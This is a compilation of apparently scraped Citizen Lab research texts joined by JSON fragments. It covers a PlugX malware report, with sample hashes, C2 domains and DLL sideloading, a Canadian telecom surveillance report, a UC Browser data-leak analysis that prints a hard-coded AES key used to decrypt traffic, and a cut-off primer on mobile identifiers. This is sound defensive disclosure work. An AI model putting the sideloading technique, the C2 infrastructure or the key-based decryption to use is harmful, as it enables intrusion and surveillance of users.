0/57\n\n\n2a544922d3ece4351c1af4ca63c24550\nDate / Time: 2015-05-06 09:28:05\nDetection rate 8/57\nDate / Time: 2015-06-05 18:38:17 20/57\nDetection rate: 20/57\n\n\n\nPlugX Attacks\nThree of the sampled we analyzed used the PlugX malware family. PlugX is a well-known malware family that researchers have observed being used in targeted attacks against NGOs, government institutions, and private companies. A Trend Micro report on PlugX, describes a long-standing campaign that previously used Poison Ivy, another malware family. Jaime Blasco at AlienVault claims to have tracked down the author of PlugX, who is allegedly based at a Chinese security company.\nIn these three samples, the embedded executable in OLE is a self extracting RAR containing the three components of PlugX: a signed legitimate executable, a malicious DLL, and a binary file containing the main payload.\nUsing a technique known as DLL sideloading, the legitimate executable runs the malicious DLL. This malicious code then decrypts and decompresses the binary file in memory which contains the main functionality. Since the malicious code is being run by a signed, legitimate executable, and the payload never exists unencrypted on disk, it is more difficult for AV to detect PlugX.\nFor two of the three Plug X samples the  the malware leverages expired certificates from legitimate vendors: one executable signed by Microsoft and one by F-Secure.\nMicrosoft Certificate\nF-Secure Certificate\nConnections to other Malware Families and  Campaigns\nWhile three attacks used PlugX malware, two other attacks did not. One of these attacks targeted Tibetan groups, the second targeted Hong Kong-based groups.\nThe non-PlugX attack against Tibetan groups communicates with free1999.jkub.com, a C2 that we have previously observed in multiple campaigns using the Surtr malware family and targeting Tibetan groups. The Valkyrie-X Security Research Group has also observed this C2 used in attacks against Hong Kong-based groups.\nThe non-PlugX attack against Hong Kong-based groups used a malware family that Symantec calls Wofeksad and connects to the C2 eset-windows.findhere.org. We have observed the Wofeskad malware family in another attack against a large International NGO that works on multiple countries and issues. However, that attack used CVE-2012-0158 and communicated with a different C2.\nDetails of the samples analyzed in this report are outlined in Table 2.\nTable 2: Sample Details\n\n\n\nSample MD5\nDelivery Mechanism\nTargeted Group\nMalware Family\nCommand and Control\n\n\n8a18a13910838d08e38db80a08e15bd5\nEmail Attachment\nHong Kong\nWofeksad\neset-windows.findhere.org\n\n\n705147c509206151c22515ef568bac51\nEmail Attachment\nHong Kong\nPlugX (Sideload F-Secure)\ndnsupdate.dynamic-dns.net\n\n\n18bb1ce405e4abac4b0fc63054beac6c\nEmail Attachment\nTibetan\nPlugX (Sideload F-Secure)\ndnsupdate.dynamic-dns.net\n\n\n2a544922d3ece4351c1af4ca63c24550\nGoogle Drive Link\nTibetan\nPlugX (Sideload Microsoft Office 2003 component)\ngood.wha.la\n\n\nd7832e76ee2c5c48ae428e57599b589e\nEmail Attachment\nTibetan\nNot identified\nfree1999.jkub.com\n\n\n\nConclusion\nThe re-purposed content, low AV detection rate, and the lack of any obvious signs to a user that the files are malicious (such as a program crash) make these attacks concerning. In the case of the Tibetan attacks, the use of CVE-2014-4114 shows a shift in tactics and a possible move away from CVE-2012-0158, which is the most commonly used CVE we have seen in attacks against the community. In addition, the use of Google Drive further suggests a potential change in tactics, possibly in response to behavioral countermeasures developed by Tibetan civil society.\nThe overlap in attacks against Tibet and Hong Kong groups also raises questions for future work. Are the attacks being conducted by the same threat actor, or is there sharing of TTPs between actors targeting these groups? Further analysis of attacks against these communities is needed to probe these questions.\nAcknowledgements\nSpecial thanks to Valkyrie-X Security Research Group.\nThe Citizen Lab’s research on Targeted Threats against Civil Society is supported by the John D. and Catherine T.

    "text": "\n\t\t\t\tMedia coverage: CBC News\nThe Telecommunications Transparency Project is happy to announce the release of The Governance of Telecommunications Surveillance: How Opaque and Unaccountable Practices and Policies Threaten Canadians. The Project is associated with the Citizen Lab, an interdisciplinary laboratory based at the Munk School of Global Affairs, University of Toronto, and the report was funded through the Canadian Internet Registration Authorities’s .CA Community Investment Program.\nThe report examines how contemporary telecommunications surveillance is governed in Canada. In it, we ask how much telecommunications surveillance is occurring in Canada, what actors are enabling the surveillance, to what degree those actors disclose their involvement in (and the magnitude of) surveillance, and what degree of oversight is given to the federal governments’ surveillance practices. We conclude that serious failures in transparency and accountability indicate that corporations are failing to manage Canadians’ personal information responsibly and that government irresponsibility surrounding accountability strains its credibility and aggravates citizens’ cynicism about the political process. In aggregate, these failings endanger both the development of Canada’s digital economy and aggravate the democratic deficit between citizens and their governments.\nKey findings include:\n\nCanadian authorities have received expansive new powers, with more planned, that have increased authorities’ powers to conduct telecommunications surveillance. Moreover,  the ‘official’ modes of surveillance (used by police and other domestic agencies to conduct surveillance) may soon be amplified should C-51 be passed into law and CSE consequently expands its domestic and foreign collaborations with CSIS\nCanadian telecommunications and government representatives work within international standards-setting forums to develop new modes of intercepting communications. Rogers Communications, in particular, has been involved in a European standards body (ETSI) and has proposed ways of defeating some forms of end-to-end encryption, discussed challenges of deploying a lawful-intercept compliant Dropbox competitor, and raised concerns about how Canadian lawful access legislation may force updates to how lawful interception is conceived\nTelecom companies’ transparency reports are a good, first, step but are lacking details needed to contextualize how often, and what kinds of, surveillance is being conducted on Canadians. Details on the kinds of legal requests (e.g. for interceptions, for stored data, etc), their annual totals, as well as subscribers affected must be added in future reports. Moreover, these companies must release information about how long they retain data as well as how they work with government to lawfully disclose Canadians’ telecommunications data to government agencies\nFederal government watchdogs – such as CSE’s oversight commission, CSIS’s review board (SIRC), and the Privacy Commissioner of Canada – are largely unable to assure Canadians that telecommunications surveillance is occurring lawfully. These agencies cannot effectively coordinate with one another, have stunted mandates, and are under resourced. These limitations are made worse by the fact that the annual interception reports tabled by federal and provincial governments are relics of the 1970s: they do not include the contemporary modes of surveillance that are most commonly used by government agencies and, in the case of provinces, are rarely placed online. Consequently it is almost impossible to know how many interceptions of government communications, let alone other kinds of telecommunications surveillance, take place annually in Canada\nThe result of the large amount of surveillance, often authorized by secret regulation or enabled through largely closed-door standards negotiations, is that neither Canadians nor their elected representatives can effectively debate or raise questions about contemporary surveillance practices. Consequently, companies’ products may be treated with skepticism and, more significantly, the democratic deficit between citizens and their governments may broaden\n\nThe policy recommendations that conclude the report are focused around transparency, accountability, and effective oversight. Core recommendations include:\n\nCompanies must enhance how they explain their data management practices. This includes more detailed transparency reporting that fixes the aforementioned deficits in current reports, as well as all companies actually releasing such reports\nGovernments currently are not accountable for the surveillance their agencies conduct; statutory reporting of all modes of telecommunications surveillance should be passed into law, so that the interception reports meaningfully reflect today’s surveillance reality\nInstitutions that are responsible for overseeing and reviewing contemporary government surveillance need expanded powers and mandates; they must be able to communicate and work with one another, be resourced (financially and legislatively) to investigate and enforce their recommendations, and a parliamentary committee should be struck that can compel review agencies to provide special reports on topics the committee believes are important. This latter recommendation would ensure that parliament – and the representatives of Canadians – actually know and can steer some of the surveillance activities undertaken by often-secretive agencies such as CSIS and CSE\n\nDOWNLOAD THE REPORT\nProject Support\n\nResearch for this research was funded through the Canadian Internet Registration Authority’s .CA Community Investment Program.

This report provides a detailed analysis of how UC Browser manages and transmits user data, particularly private data, during its operation. Our research was prompted by revelations in a document leaked by Edward Snowden on which the Canadian Broadcasting Corporation (CBC) was preparing a story. The CBC contacted us requesting our comment. The document, apparently prepared in 2012 by Canada’s signals intelligence agency, the Communications Security Establishment (CSE), noted the existence of security vulnerabilities in UC Browser. Given the Citizen Lab’s ongoing research into popular Asian communications tools, and the possibility of vulnerabilities affecting a large number of users, we decided to conduct an independent investigation of UC Browser. While media outlets are publishing a story about the CSE document, we cannot determine if the problems we identify in UC Browser and that are described in this report are identical to those referenced in the 2012 CSE document.\nSummary of findings\nWe have identified a series of major security and privacy issues in the English language and Chinese language editions of the Android version of UC Browser. Our notification to the parent companies is described below in detail. We found that both versions of the application leak a significant amount of personal and personally-identifiable data; as a result, any network operator or in-path actor on the network can acquire a user’s personally identifiable information (including cellular subscriber information, mobile device identifiers, geolocation data, and search queries) through trivial decrypting of traffic or by observing unencrypted traffic. Specifically, the issues we found include:\nTransmission of personally identifiable information and user search queries without encryption:\n\nUser data, including IMSI, IMEI, Android ID, and Wi-Fi MAC address are sent without encryption to Umeng, an Alibaba analytics tool, in the Chinese language version.\nUser geolocation data, including longitude/latitude and street name, are transmitted without encryption by AMAP, an Alibaba mapping tool, in the Chinese language version.\nUser search queries are sent without encryption to the search engine Shenma (in the Chinese language version) or Yahoo! India and Google (in the English language version).\nReason for concern: The transmission of personally identifiable information, geolocation data and search queries without encryption represents a privacy risk for users because it allows anyone with access to the data traffic to identify users and their devices, and collect their private search data.\n\nTransmission of personally identifiable information and geolocation data with easily circumvented encryption:\n\nLocation and user data, including IMSI, IMEI, and data about nearby cellular towers and Wi-Fi access points, are sent with easily circumvented encryption by AMAP, an Alibaba mapping tool, in the Chinese language version.\nReason for Concern: UC Browser’s transmission of personally identifiable subscriber data, mobile device identifiers, and user geolocation data without effective encryption presents a security and privacy risk for users.\n\nPrivate user data is retained on the device even after clearing the application’s cache:\n\nIn the Chinese language version, when users attempt to delete their private data by clearing the application’s cache their DNS lookups are not deleted.\nReason for concern: The cached record of DNS lookup data would allow for a third party with access to the device to identify the websites that a user visited.\n\nThis report is a continuation of our prior work examining the security and privacy of popular mobile applications in Asia. Our previous research includes investigations of censorship practices of search engines offered by Google, Microsoft, and Yahoo! in the Chinese market along with domestic Chinese search engine Baidu. In addition, we have analyzed keyword censorship and surveillance in TOM-Skype (the Chinese version of Skype at the time) and keyword censorship in Sina UC, another Chinese instant messaging platform. We are currently conducting comparative analysis of mobile chat applications used in Asia including WeChat, LINE, and KakaoTalk.\n\nFor those who may be interested in more context on mobile security and privacy, please see our general introduction to mobile communications. Click on the image below to read “The Many Identifiers in our Pockets.”\nFigure 1: Overview of mobile device data transmission.\n\nNotification\nWe disclosed our findings to Alibaba and UCWeb on April 15, 2015, and informed them that we would publish this report on or after April 29, 2015. Alibaba responded to our notification on April 19, 2015, indicating that their security engineers were investigating the issue. We followed up on April 23, 2015 to reiterate our intention to publish this report on or after April 29, 2015. As of May 19, 2015 we have not received further communication from Alibaba or UCWeb.\nOn May 19, 2015 we tested version 10.4.1-576 of the Chinese language version of UC Browser, which was downloaded from the uc.cn website. This version does not appear to send location data insecurely to AMAP as described in this report. However, the issues we describe in this report relating to insecure data transmission to the Umeng component, as well the lack of encryption on search queries, remain in this version. Users who use the Chinese version of UC Browser should upgrade the application and ensure they are running version 10.4.1-576 or above.\nSection 2 – UC Browser: Quick Background\nUC Browser is a mobile web browser for Android, IOS, Windows Phone, and other platforms. A Windows version was released in April 2015. The application is the flagship product of UCWeb Inc., a Guangzhou, China-based company founded in 2004. After an initial investment by e-commerce giant Alibaba, the two companies launched the joint mobile search service Shenma. Shenma reportedly has more than 100 million users per month. In June 2014, Alibaba purchased the remaining stake in UCWeb in the biggest ever merger of Chinese Internet firms.\nUC Browser is among the most popular mobile apps in the Chinese Internet space. UC Browser claims to have more than 500 million registered users, and is reported to be the most popular mobile browser in China and India. Overall, the application is the fourth most popular mobile browser globally, and is behind only pre-installed Chrome, Android, and Safari browsers.\nUCWeb Inc. claims the app has 100 million daily active users, while parent company Alibaba’s 2014 prospectus reported the number of active users at 264 million in June 2014. UC Browser was ranked as the second most popular app by usage in China in January 2013. The company has also increased its global push, and claims it has at least 10 percent market share in 10 different countries.\nUC Browser offers a custom default homepage with links to search engines and social media integration, as well as news, weather, and shopping services. A set of features are aimed at reducing bandwidth usage on mobile clients. “Cloud download,” for example, allows users to send downloads directly to UDisk (a UC cloud offering) in order to save on bandwidth costs. In addition to this feature, UC Browser can act as an optional proxy and compress web sites it fetches to reduce bandwidth consumption.\nSection 3 – Methodology and Technical Analysis\nThis section describes the methods we used to analyze UC Browser, and presents detailed findings from our analysis.\nWe isolated specific versions of the Chinese- and English-language builds of UC Browser for Android and analyzed their mobile (cellular network) data and Wi-Fi traffic. We also analyzed the application’s data retention and deletion practices. Our analyses revealed major privacy and security issues with all of the tested versions of UC Browser. Figure 2 highlights the major findings for the Chinese language version of UC Browser.\nFigure 2: A visual summary of privacy and security issues presented by UC Browser.\nTest Setup\nWe isolated specific versions of the Chinese- and English-language builds in order to examine UC Browser’s security and privacy features. Specifically, we monitored the data that was transmitted between the application and external servers. We were specifically interested in what, if any, personally identifiable information was transmitted by UC Browser, and whether encryption was used to secure those transmissions. We analyzed the state of the application, both in-idle state (soon after the app was opened) as well as during use of the app’s features, such as searching. Lastly, we examined the data UC Browser stored on the device, and whether that data was protected with encryption.\nTests were conducted within an Android emulator and on an Android handset. All traffic sent to and from the device was collected and analyzed using the packet-capture utility WireShark. We decompiled the downloaded APKS with APKtool and then analyzed the code for functionality related to the transmission of user data.\nVersions Analyzed\nWe analyzed two versions of UC Browser for Android. We downloaded the two versions from different app stores: the Chinese-language version of UC Browser (UC浏览器) was downloaded in March 2015 from the Xiaomi mobile app store. Henceforth we will refer to this app as UC Browser (Chinese) to distinguish between versions. We downloaded the English version, henceforth UC Browser (English), in April 2015 from the UCWeb website. These two versions have differences beyond language: by default, the Chinese version uses Shenma (sm.cn) for search, while the English version uses Yahoo! India and Google; the Chinese version has links to China-based services such as Baidu, Sina Weibo, and Youku, while the English version uses services such as Google, Facebook, and Twitter.\nFigure 3: Side-by-side comparison of UC Browser (Chinese) and UC Browser (English).\nFigure 4: Side-by-side comparison of permissions requested during installation of UC Browser (Chinese) (left) and UC Browser (English) (right) versions of UC Browser.\nFigure 4 shows the permissions that the Chinese and English versions of UC Browser requires when being installed on an Android device. For the purposes of this report, it is notable that the application requests access to phone status and identity, geolocation information, the ability to read Web bookmarks and history, as well as to extensive networking information. As discussed further in the report, UC Browser (Chinese) accesses phone identity and geolocation information and transmits it insecurely.\nTable 1 summarizes the two versions of UC Browser we analyzed:\n\n\n\nPlatform\nVersion (Language)\nVersion\nDate Downloaded\nSource\n\n\nAndroid\nUC Browser (Chinese) (UC浏览器)\n10.2.1_161\nMarch 12, 2015\nXiaomi App Store: http://app.mi.com/detail/1363\n\n\nAndroid\nUC Browser (English)\n10.4.1.565\nApril 10, 2015\nDirect from UC website: http://www.ucweb.com/ucbrowser/download/android.html\n\n\n\n3.1 UC Browser (UC浏览器) Chinese language version 10.2.1_161\nThis section describes our findings from analyzing the Chinese language version of UC Browser (UC浏览器), downloaded from the Xiaomi mobile app store. Our test results are summarized in Table 2:\nTable 2: Summary of test results for UC Browser (Chinese).\n\n\n\nTest\nMode\nResults\n\n\nIdle test\nCell only\n\n\nThe AMAP component of UC Browser (Chinese) contacts apilocate.amap.com, and sends user and device identifiers (IMSI, IMEI) and location data (cell tower data) with easily circumvented encryption.\nThe Umeng component of UC Browser (Chinese) sends device identifiers (including IMSI, IMEI, Android ID) without encryption.\n\n\n\n\nIdle test\nCell + Wi-Fi\n\n\nThe AMAP component  sends, with easily circumvented encryption, the same data as noted in the row above (“Cell only” mode). In addition, it sends device Wi-Fi MAC address, SSID, and MAC address of the Wi-Fi access point to which the user is connected, and nearby wireless access points.\nThe Umeng component sends the same device identifiers as noted in the row above (“Cell only” mode), with the addition of the device Wi-Fi MAC address, without encryption.\n\n\n\n\nSearch\nCell only & Cell + Wi-Fi\n\n\nSearch queries using the search bar are sent to Alibaba’s Shenma search engine without encryption.\n\n\n\n\nData storage\nCell only & Cell + Wi-Fi\n\n\nAfter clearing the application’s private data, the cached record of DNS lookup data remains.\n\n\n\n\n\nIdle test\nIn our first test, we launched the application, let UC Browser (Chinese) idle for 270 seconds, and collected all network traffic sent to and from the device. We then analyzed that traffic to determine what data was being sent and its destination. We performed the test first by connecting the mobile device to the Internet using a cellular connection, and, second, by connecting the device to the Internet using a Wi-Fi network.\nTesting UC Browser (Chinese)’s Cellular-Only Communication\nUpon starting the application, the application communicated with the following hosts over HTTP:\nFigure 5: Hosts communicated with by UC Browser (Chinese) within 270 seconds of launching the app\nEasily decrypted data sent to AMAP\nAs seen in Figure 5, the majority of communications (57% of HTTP packets in our 270 second sample) are between the application and apilocate.amap.com. AMAP is a mobile mapping application that was originally developed by Autonavi, a company acquired by Alibaba in April 2014. AMAP is estimated to have more than 100 million users.\nInvestigating these communications further, we saw that a typical exchange with apilocate.amap.com looked as follows:\nFigure 6: Sample communication between UC Browser (Chinese) and apilocate.amap.com. The user-agent string indicates this communication is from “AMAP Location SDK Android 1.0.5.” We have redacted personally identifiable data.\nAs we were interested in determining what, if any, data the application transfers from the device, the block of data sent to apilocate.amap.com was of interest. We used a freely available tool, pyhttpextract, to decipher the contents of this encoded data block. After using this tool, we saw that UC Browser (Chinese) sent the following data to apilocate.amap.com:\nFigure 7: Deciphered communication between UC Browser (Chinese) and apilocate.amap.com. Personally identifiable data redacted with asterisks.\nThe encoded data sent within the ‘<sreq>’ structure intrigued us because it was a relatively large block of data. Its size suggested that it might contain user data. To confirm if user data was present we first analyzed how the data was encrypted. Using apktool we decompiled UC Browser (Chinese) to see how the application created and serialized the ‘<sreq>’ structure. After decompiling, we looked for the string ‘sreq’ in the outputted code and found this in a directory associated with the com/aps class (Android programs often incorporate a mix of components, called classes, sometimes from different developers).\nSince the com/aps/* directory serializes the ‘sreq’ structure in which we were interested, we next examined this directory to see which .smali files (code format used by Android) translated to which .java filenames:\nFigure 8: Mapping of smali files in com/aps directory to java source code.\nWe examined the file Aes.java in searching for the component of the application that encrypted data in the ‘sreq’ structure (AES is a widely used form of encryption). The file showed that encryption was performed using symmetric AES/CBC encryption that used the hard-coded key ‘autonavi_amaploc’. The encryption process is shown in Figure 9:\nFigure 9: Aes.java smali code showing AES/CBC encryption with a hard-coded key.\nThe use of symmetric encryption with a hard-coded key means that anyone who knows the key can decrypt UC Browser (Chinese) traffic in transit. Moreover, key holders can also retroactively decrypt any historical data that they have collected or obtained.\nWe used a standard AES decryption tool to decrypt the ‘sreq’ data structure in order to demonstrate that retroactive decryption was possible. After formatting the structure for readability, the data sent looked as follows:\nFigure 10: Decrypted data sent via AMAP service. Personally identifiable data redacted with asterisks.\nThe data sent to apilocate.amap.com included a number of unique identifiers. The first set referred to the mobile device itself: the IMSI, IMEI, and unique user data related to this installation of UC Browser (Chinese). The second set referred to details of the cell tower to which the device is connected: the Mobile Country Code (MCC), Mobile Network Code (MNC), Location Area Code (LAC), Cell Tower ID, and the cell tower signal strength. In aggregate, these sets of information can be used to identify the cellular subscriber, the physical handset, and the physical location of the device.\nAfter transmitting this location information, the application received an unencrypted response that included the longitude/latitude of the user (the ‘cenx’ and ‘ceny’ values seen below), as well as the specific street name where the user was located, as shown below in Figure 11:\nFigure 11: Unencrypted response received by UC Browser (Chinese).\nSuch identifications are problematic because, using the information and the rate at which the application transmits it, we can determine a cell tower location with considerable accuracy and thus geolocate the person using the application. As an example, we were able to pinpoint the location of our lab where we conducted the testing, as shown in Figure 12:\nFigure 12: Example of location identified from MCC, MNC, LAC, and CellID.\nIn summary, we strongly suspect that AMAP is the component of UC Browser (Chinese) that is responsible for transmitting the geolocation information. Our belief is based on the fact that the user-agent string (“AMAP Location SDK Android 1.0.5”), the location where the data is sent (apilocate.amap.com), and the text of the hard-coded key (‘‘autonavi_amaploc”) all reference AMAP. Given the apparent integration between AMAP and UCWeb we believe that it is likely that AMAP was incorporated into UC Browser (Chinese) to provide mapping and geolocation functionality.\nUnencrypted data transfer to Umeng\nAs seen in Figure 5, UC Browser (Chinese) also periodically contacted utop.umengcloud.com and upoll.umengcloud.com when idle. Umeng is a mobile analytics service that is reportedly used by over 180,000 applications. It was purchased by Alibaba in 2013. The data structure sent, unencrypted, to utop.umengcloud.com hosts looked as follows:\nFigure 13: GET request made to utop.umeng.cloud with a cellular Internet connection showing that application sends IMSI, IMEI, Android ID, and build serial number without encryption. Personally identifiable data redacted with asterisks.\nA number of unique personal identifiers are included in this data structure. This included the IMEI, IMSI, device Android ID (‘c6’), and the build serial number (‘c5’). Like AMAP, we believe it is likely that Umeng was incorporated into UC Browser (Chinese) to provide in-app analytics.\nTesting UC Browser’s Wi-Fi Communication\nEasily decrypted data sent to AMAP\nUpon starting the application and letting it idle for 270 seconds while connected to a Wi-Fi network, we found that UC Browser (Chinese) sent the same easily-decrypted user data seen in Cell only communication. However, in addition the application sent data about nearby Wi-Fi access points, including their MAC address. These data elements are identified in Figure 14:\nFigure 14: Data sent by UC Browser (Chinese) to AMAP when Wi-Fi is enabled. Personally identifiable data redacted with asterisks.\nUnencrypted data transfer to Umeng\nWhen connected to a Wi-Fi network, personal user data is also sent unencrypted to Umeng. In addition to the data sent while connected to a cell network, the application also sent the device’s Wi-Fi MAC address. Figure 15 shows a sample of traffic sent to utop.umengcloud.com while connected to a Wi-Fi network:\nFigure 15: Traffic sent to utop.umengcloud.com during idle. Personally identifiable data redacted.\nRe-formatting the above traffic for readability shows the following GET request to utop.umengcloud.com:\nFigure 16: GET request made to utop.umengcloud.com with Wi-Fi enabled showing that IMSI, IMEI, Android ID, and device Wi-Fi MAC address are sent unencrypted. Personally identifiable data redacted with asterisks.\nIn summary, when connected to a Wi-Fi network, the IMSI, IMEI, Android ID, and Wi-Fi MAC address are sent unencrypted by UC Browser (Chinese) to umengcloud.com.\nExamining the Search Functionality of UC Browser (Chinese)\nThe Chinese version of UC Browser uses the mobile search engine Shenma, a joint venture between UCWeb and Alibaba. Search queries that are entered into the search bar were sent without encryption to http://m.sm.cn, as seen in Figure 17:\nFigure 17: Search for “cntower” using Shenma mobile search engine via UC Browser (Chinese) search bar.\nInsecure Data Deletion in UC Browser (Chinese)\nAs part of our research we conducted tests to determine what, if any, personal user data was stored on the device. We began by selecting the option in the application allowing users to delete private information from the device, such as cookies and browser history. After selecting this option, we examined whether user data remained on the device by checking the cache directory for the application. While most user data was deleted, a record of the application’s DNS lookups remained, as shown in Figure 18:\nFigure 18: DNS records found in cache after private information was deleted.\nThis DNS data was stored in the cache as a serialized LinkedHashMap, and persisted even after all other data in the cache had been cleared using the application’s feature to clear private browsing data. There was sufficient plaintext remaining that the records could be read using a simple text editor. In other words, even if a user attempts to clear browsing records their personal data remains available for scrutiny and can be trivially accessed.\n3.2 UC Browser (English) language version 10.4.1.565\nWe next conducted tests of the English language edition of UC Browser version 10.4.1.565. This version was downloaded as an APK directly from the UCWeb English-language website. Our test results are summarized in Table 3:\nTable 3: Summary of test results for UC Browser (English).\n\n\n\nTest\nBoth\nResults\n\n\nIdle test\nCell only & Cell + Wi-Fi\n\n\nNo issues identified\n\n\n\n\nSearch\nCell only & Cell + Wi-Fi\n\n\nSearch queries sent through the search bar are sent unencrypted to Yahoo! India\nSearch queries sent through the address bar are sent unencrypted to Google\n\n\n\n\nData storage\nCell only & Cell + Wi-Fi\n\n\nNo issues identified\n\n\n\n\n\nIdle test\nWe performed the same idle test described previously with the English language version: the application was launched, left idle for 270 seconds, and all traffic sent to and from the device was collected. We first performed the test by connecting the mobile device to the Internet using a cellular connection and, second, by connecting the device to the Internet using a Wi-Fi network.\nOur analysis showed that UC Browser (English) did not send and receive traffic through the AMAP or Umeng component as in the Chinese language version. We were not able to identify any easily decrypted traffic sent in the English language version.\nSearch\nUC Browser (English) has two methods for performing web searches. The first method is by tapping the “Search” button shown in the upper-right hand corner of the application. The second method is by entering a search term in the address bar to the left of the search button. Both of these methods can be seen in the following screenshot:\nFigure 19: Screenshot of search features of UC Browser (English). Both the “Enter URL” and “Search” fields can be used to perform a web search.\nWe performed searches through both methods and observed the traffic sent and received by UC Browser (English). Performing the search through the search bar sent data unencrypted to Yahoo! India search, as shown in this packet capture:\nFigure 20: Packet capture of search for ‘toronto bluejays’ (highlighted in blue) performed using search bar in UC Browser (English). Search query is sent unencrypted to Yahoo! India.\nIn addition, the results of such a search are displayed with a green checkmark at the far left of the search bar:\nFigure 21: Search results for an unencrypted search to Yahoo! India with a green checkmark.\nThe use of this green checkmark could lead to some confusion with users, as most web browsers use a green icon to the left of the search bar to reflect an encrypted connection. UC Browser (English) displays a green padlock to the left of the browser bar if the HTTPS-encrypted version of a site is opened manually in a browser.\nNext, we performed a search by entering a search term in the address bar of UC Browser (English). This search was sent unencrypted to Google search:\nFigure 22: Packet capture of search for “go jays” (highlighted in blue) performed using the address bar of UC Browser (English).\nIn summary, both methods of performing a search in UC Browser (English) sent the search query unencrypted to either Yahoo! India or Google. The standard web version of each of these search engines uses HTTPS encryption by default.\nData storage\nFinally, we analyzed how UC Browser (English) stored personal user data on the device. The English language version, unlike the Chinese language version, did not store DNS lookup data as part of the private browsing data. Further, using the option within the application to delete private browsing data did delete all such data.\nSection 4 – UC Browser Leaks Sensitive User Data\nOur analysis shows that both versions of UC Browser leak information to third parties, but that privacy and security concerns for the Chinese language UC Browser are much greater. The Chinese UC Browser version we tested (“UC Browser (Chinese)” in this report) leaks a significant amount of personally identifiable information, raising major security and privacy concerns. The leakage of the IMSI, IMEI, and geolocational information can identify a cellular subscriber, the device that they are using, and their specific location. As a result of the weak encryption used by UC Browser, any party with access to the data traffic — either real-time or historical — can link specific devices to specific places at specific times. And if the decrypting party has a large volume of data they can track subscribers vis-a-vis their mobile devices as they move around the world.\nJust by installing and opening UC Browser (Chinese), users unwittingly expose a significant number of personal identifiers and location information to numerous third parties. Although users must agree to grant the application permission to access personal identifiers and location data, it is not made clear to the user how this data will be shared. This exposed information includes:\n\nDevice info sent unencrypted: IMSI, IMEI, Android ID, and Wi-Fi MAC address\nSearch queries sent unencrypted\nLocation data received unencrypted: longitude/latitude and street name\nDevice and location sent with breakable encryption: IMSI, IMEI, MCC, MNC, LAC, CellId, nearby cellular towers and Wi-Fi access points\n\nIn many political jurisdictions (including China and India) it is common for authorities to require telecommunications companies, cellular providers, and Internet cafes to share the data they collect with security agencies as a condition of obtaining an operating license. By leaking a large volume of fine-grained data points to multiple network operators, the UC Browser app is increasing the risks to its users that such data may be used against them by authorities, criminals, or other third parties.\nThe data leakages we outline are particularly problematic for individuals who use their devices to engage in sensitive communications or for whom disclosing their physical location could place them at increased risk. Similarly, individuals concerned with protecting sensitive activities related to their work while traveling or communicating should be concerned about the potential for industrial espionage.\nWhile we concluded that UC Browser (English) leaks considerably less identifying information, users might be surprised to realize that, despite the presence of an icon suggesting security in one of the search bars, their search terms are transmitted without encryption to Google and Yahoo! India servers.\nOn the issue of mobile security and privacy\nUltimately, the concerns identified here with respect to UC Browser demonstrate the larger challenges of ensuring user security and privacy within the burgeoning market for mobile applications. The mobile ecosystem is complex and multi-layered, involving large volumes of personally identifiable information that are transmitted across networks, devices, operating systems, and applications owned and operated by numerous private companies across many political and regulatory jurisdictions. Such a complex system underscores the importance of systematically evaluating the privacy and security of mobile communications as they become integral to the everyday lives of individuals and communities worldwide.\nWould Encryption Solve UC Browser’s Problems?\nWe have highlighted the lack of encryption for personally identifiable data as a key reason for concern over UC Browser. Encrypting data that is this sensitive certainly represents an industry best practice, and it is unclear why only the English version seems to implement encryption consistently. Modifying the Chinese version to match the encryption used in its English counterpart could be an important step in increasing user security, as would encrypting queries to Google and Yahoo! India in the English version.\nHowever, even if all data were strongly encrypted, this step would simply simply make it more difficult for unauthorized parties to read the contents of data transmissions. Encrypting sensitive user data can limit the number of actors who can access the data but does not prevent the inappropriate collection, retention, and analysis of the data by application developers and their commercial partners. Put bluntly: increases in transport security do not necessarily improve corporate data handling practices.\nThe core advantage of better encrypting data traffic is to engage, and hopefully make more transparent, the processes that government agencies and other third parties must engage in to access information that is collected, retained, and processed by application developers. In many jurisdictions, authorities will first have to obtain a court order before lawfully accessing the application developers’ data. Nevertheless, when data is held in jurisdictions where this process is not enshrined, or where there are strong incentives to share the data, encryption alone does not solve the problem.\nAcknowledgments\nThis project was supported by the John D. and Catherine T.

    "description": "Version 1.0 May 13, 2015",
    "text": "\n\t\t\t\tVersion 1.0 May 13, 2015\nDownload PDF version\nThe phones and tablets that we carry constantly transmit a steady stream of information to third parties. Our searches, shares, and messages represent only a fraction of the sensitive, private, and identifiable data that our devices generate. The data includes many ‘identifiers,’ ranging from a serial-like IMEI number that is unique to each handset to unique operating system identifiers and even location information. Some of these identifiers are personally identifiable and ‘baked in’ to the devices we carry around with us, while others are created as we use apps or browse the Internet. Moreover, many of these identifiers are transmitted and collected without notification to users, ending up with third parties, including app developers and advertising partners.\nThe constant transmission of identifier data is important to delivering seamless and tailored services and content to users. However, the uniquely revealing nature of identifiers, combined with the inconsistencies in how they are collected, transmitted, and secured, raise serious security and privacy concerns.\nThis document:\n\nDescribes key identifiers for mobile devices. \nHighlights some identifiers that are accessible, and often collected, by various parties.\nHighlights the risks associated with the widespread transmission and use of these identifiers.\n\n \nFigure 1: Overview of mobile device data transmission.\nKey Identifiers for Mobile Devices\nMobile devices are assigned many identifiers that are used by hardware manufacturers, telecommunications service providers, operating system manufacturers, advertisers, and application developers. The identifiers are used to register devices to mobile networks, to ensure that operating systems operate smoothly, and that applications work correctly. They can also be used to facilitate user tracking, and for targeting advertising.\nIn what follows we discuss some of the different kinds of identifiers that are present at several levels (see Figure 1):\n\nPhysical device (e.g., cell phones)\nCommunications network (e.g., AT&T)\nOperating System (e.g., Android or iOS)\nApplication layer (e.g., Angry Birds)\n\nPhysical Device\n\n\n\nAcronym\nWhat it does\n\n\nMAC Address\nMedia Access Control address uniquely identifies wireless transmitters like Bluetooth and Wi-Fi chips in the device\n\n\nIMEI1\nThe International Mobile Equipment Identifier is a string of numbers that is unique for every device\n\n\n\nTable 1: Selected Physical Device Identifiers\nThere are a set of ‘hard baked’ identifiers associated with different components of mobile devices. The various radios that are integrated with the device, such as those associated with cellular, wireless, bluetooth, and near field communications, are all assigned unique Media Access Control (MAC) addresses.  The MAC address is assigned to a radio, although it can sometimes be rewritten using software programs. The MAC address of the device’s Wi-Fi chip is typically broadcast when Wi-Fi is enabled and the device is searching for access points. The International Mobile Equipment Identifier (IMEI) is tied to physical devices and remains the same throughout the life of the device. The IMEI denotes the standards board responsible for assigning the identifier, the time that it was manufactured, the serial number issued to the model of the device, and the version of the software installed on the phone.\nCommunications Network\n\n\n\nAcronym\nWhat it does\n\n\nMIN / MSIN\nThe Mobile Identification Number or Mobile Subscription Identification Number uniquely identifies a mobile device to a carrier. The number is included in the IMSI as an important 